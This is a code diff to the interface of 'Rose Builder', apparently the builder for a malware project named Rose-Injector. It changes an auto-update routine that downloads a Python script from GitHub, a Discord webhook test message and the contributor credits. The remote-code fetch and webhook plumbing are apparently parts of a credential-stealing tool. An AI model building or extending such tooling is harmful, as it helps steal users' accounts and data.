@@ -52,7 +52,7 @@ def auto_update():
         return 
     
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/v8.pyw"
+            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/v8.py"
     )
     
     code = requests.get(_code, timeout=10).text
@@ -191,7 +191,7 @@ async def test_webhook(webhook_url):
                 timestamp="now"
             )
             embed.set_author(name="Success", icon_url=__icon__)
-            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
+            embed.set_footer(text="Rose Builder | By pierro, suegdu, S1LKT0UCH, svn", icon_url=__icon__)
             await hook.send(embed=embed)
         return 0
     except Exception as e:
@@ -269,16 +269,16 @@ def _github():
             with ui.row():
                 with ui.card_section():
                     ui.label("xpierroz").classes("text-h6")
-                    ui.markdown('<em>- "GUMBO MAKE A FUCKING PR"</em>').classes("text-subtitle5")
+                    ui.markdown('<em>- "S1LKY MAKE A FUCKING PR"</em>').classes("text-subtitle5")
                     with ui.row():
                         #ui.label(" ") # Because the button are so sticked together without (sex button) - xpierroz 03/24
                         ui.button(on_click=psocials.open_xpierroz).props("round icon=code color=blue-11")
                         ui.button(on_click=psocials.open_xpierroz_insta).props("round icon=star_rate color=amber-8")
 
                 with ui.card_section():
-                    ui.label("Gumbobrot").classes("text-h6")
+                    ui.label("S1LKT0UCH").classes("text-h6")
                     ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
-                    ui.button(on_click=psocials.open_gumbobrot).props("round icon=code color=blue-11")
+                    ui.button(on_click=psocials.open_S1LKT0UCH).props("round icon=code color=blue-11")
 
             with ui.row():               
                 with ui.card_section():
